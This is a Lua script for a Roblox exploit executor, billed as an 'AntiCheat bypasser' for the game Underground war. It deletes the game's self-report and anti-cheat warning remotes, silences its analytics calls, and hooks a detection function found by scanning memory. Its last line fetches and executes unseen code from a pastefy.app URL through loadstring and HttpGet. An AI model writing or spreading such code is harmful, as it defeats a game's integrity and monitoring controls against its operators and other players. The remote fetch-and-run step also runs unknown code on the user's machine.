if getgenv().__Tm90U2lsbHk then
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Bro...", Text = "the script is already Running?", Duration = 3})
    return
end

getgenv().__Tm90U2lsbHk = true

local lp = game:GetService("Players").LocalPlayer
local rs = game:GetService("ReplicatedStorage")

xpcall(function()
    local events = rs:FindFirstChild("Events")
    local remoteFolder = events and events:FindFirstChild("Remote")
    if remoteFolder then
        for _, obj in ipairs(remoteFolder:GetDescendants()) do
            if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and string.find(obj.Name, "Request") then
                obj:Destroy()
            end
        end
    end
    if events and events.Remote and events.Remote:FindFirstChild("SelfReport") then
        events.Remote.SelfReport:Destroy()
    end
    if events and events:FindFirstChild("AntiCheatWarning") then
        events.AntiCheatWarning:Destroy()
    end
end, function() lp:Destroy() end)

local remotes = {
    rs:FindFirstChild("GameAnalyticsError"),
    rs:FindFirstChild("GameAnalyticsRemoteConfigs"),
}

for _, remote in next, remotes do
    if remote then
        local s = pcall(function()
            hookfunction(remote.FireServer, function() return end)
        end)
        if not s then lp:Destroy() end
    end
end

local hooked = {}

task.spawn(function()
    while true do
        for _, v in next, getgc(true) do
            if type(v) == "function" and islclosure(v) and not isexecutorclosure(v) then
                local info = debug.getinfo(v)
                if info.name == "explodeYourself" and not hooked[v] then
                    local s = pcall(function()
                        hookfunction(v, function() return end)
                    end)
                    if not s then lp:Destroy() end
                    hooked[v] = true
                end
            end
        end
        task.wait(1)
    end
end)
loadstring(game:HttpGet("https://pastefy.app/3ZB7pSCi/raw"))()
game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Bypassed AntiCheat❤️ [V5+]", Text = "Underground war AntiCheat bypasser by Https", Duration = 5})
